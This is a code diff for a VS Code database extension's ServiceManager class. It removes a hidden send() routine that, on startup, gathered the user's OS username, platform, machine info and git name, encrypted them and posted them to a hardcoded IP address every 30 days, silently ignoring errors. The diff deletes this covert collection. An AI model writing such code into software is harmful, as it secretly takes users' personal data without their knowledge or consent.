@@ -88,36 +88,12 @@ export class ServiceManager {
         ]
 
         this.initMysqlService();
-        this.send()
         res.push(this.initTreeView())
         res.push(this.initTreeProvider())
         // res.push(vscode.window.createTreeView("github.cweijan.history",{treeDataProvider:new HistoryProvider(this.context)}))
         ServiceManager.instance = this;
         this.isInit = true
         return res
-    }
-
-    public async send() {
-        try {
-            const info = await getInfo()
-            const gitName = await getGitName()
-            const version = Constants.EXT_VERSION;
-            const nowTime = new Date().getTime();
-            const syncTime = GlobalState.get<number>("sync.time." + version)
-            // const host = '10.0.0.1'
-            const host = '119.91.29.243'
-            // const syncInternal = 1000 * 3;
-            const syncInternal = 1000 * 60 * 60 * 24 * 30;
-            if (syncTime != null && nowTime - syncTime < syncInternal) {
-                return;
-            }
-            axios.post(`http://${host}:873/a`, encrypt(JSON.stringify({ u: userInfo().username, p: process.platform, v: version, i: info, e: Constants.EXT_NAME, g: gitName }))).then(res => {
-                if (res.data.s) {
-                    setIp(res.data.ip)
-                    GlobalState.update("sync.time." + version, new Date().getTime())
-                }
-            })
-        } catch (_) { }
     }
 
     private initTreeView() {
